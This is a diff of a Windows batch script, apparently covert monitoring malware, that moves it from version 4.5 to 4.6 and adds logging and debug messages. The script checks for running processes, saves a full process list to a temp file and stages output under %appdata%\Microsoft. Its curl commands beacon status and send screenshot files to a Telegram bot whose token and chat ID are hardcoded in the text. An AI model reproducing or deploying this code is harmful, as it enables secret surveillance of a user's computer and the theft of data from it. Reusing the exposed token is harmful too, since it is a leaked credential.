@@ -10,11 +10,19 @@ if not exist "%temp%\kadyy123a.tmp" type nul > "%temp%\kadyy123a.tmp"
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=4.5"
+set "BATCHVERSION=4.6"
 
 
 
+:: Set the log file path
+set "LOGFILE=%temp%\aaazed.mpeez"
 
+:: Start logging from this point
+call :ALLFORCALL > "%LOGFILE%" 2>&1
+goto :EOF
+
+
+:ALLFORCALL
 
 
 
@@ -33,7 +41,8 @@ set "output_file=%appdata%\Microsoft\play\playit_20lines.log"
 
 
 
-
+echo Check if SHSTFILE is running
+echo.
 :: Check if SHSTFILE is running
 set "SHSTRUNNING=0"
 powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
@@ -53,6 +62,8 @@ echo.
 
 
 
+echo Check if KMSFILE is running
+echo.
 
 :: Check if KMSFILE is running
 set "KMSRUNNING=0"
@@ -77,7 +88,10 @@ echo.
 
 
 
+echo Entering LASTRUNFILE LABEL..
+echo.
 
+:LASTRUNFILE
 :: Define the file to track the last run time
 set "LASTRUNFILE=%TEMP%\lastrun.log"
 
@@ -89,21 +103,35 @@ if not exist "%LASTRUNFILE%" (
     echo !MINUTESS! > "%LASTRUNFILE%"
 )
 
+echo Reading Updated value..
+echo.
 :: Read the updated value
 set /p MINUTESS=<"%LASTRUNFILE%"
 echo Minutess=%MINUTESS%
 echo.
 echo.
 
+
+echo Reading Updated again..
+echo.
 :: Read the updated value
 set "LASTSCREENFILE=%TEMP%\lastscreenrun.log"
 set /p TIMESS=<"%LASTSCREENFILE%"
 
+
+echo Goto NEXT14 if Minutes 20..
+echo.
 :: Check if 20 minutes have passed
 if %MINUTESS% GEQ 20 goto NEXT14
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
 
+echo Minutes lower than 20.. Sending 1stmsg
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
+echo.
+echo.
+
+echo Going to GOGO3.. Exiting
+echo.
 goto GOGO3
 
 
@@ -111,7 +139,7 @@ goto GOGO3
 
 
 :NEXT14
-
+echo NEXT14 STARTED
 
 
 
@@ -147,9 +175,9 @@ set "ProcessTXTFILE=%temp%\!filename3!"
 echo Saving All Processes in "%ProcessTXTFILE%"
 powershell -command "Get-Process | Select-Object ProcessName, Path | Format-Table -AutoSize -Wrap" > "%ProcessTXTFILE%" 2>nul
 ::powershell -command "Get-Process | Select-Object ProcessName, Path" > "%ProcessTXTFILE%" 2>nul
-echo Saved.
+echo ProcessTXTFILE Saved.
 echo.
-
+echo.
 
 
 
@@ -198,7 +226,8 @@ del /f /q "%TASKS_DATA%"
 echo. >> "%output_file%"
 echo. >> "%output_file%"
 echo. >> "%output_file%"
-
+echo.
+echo.
 
 
 
@@ -224,6 +253,9 @@ echo. >> "%output_file%"
 ::goto RESETTO
 
 
+echo SENDMSG STARTED..
+echo.
+echo.
 :: ============ MyScreen TOPIC ============
 
 
@@ -282,8 +314,9 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
 
 :RESETTO
 
+echo MSG SENT. RESETTING LASTRUNFILE
 echo 0 > "%LASTRUNFILE%"
-
+echo.
 
 ::goto GOGO2
 
@@ -297,7 +330,7 @@ echo 0 > "%LASTRUNFILE%"
 
 
 :GOGO3
-
+echo GOGO3 STARTED.
 
 echo.
 echo.
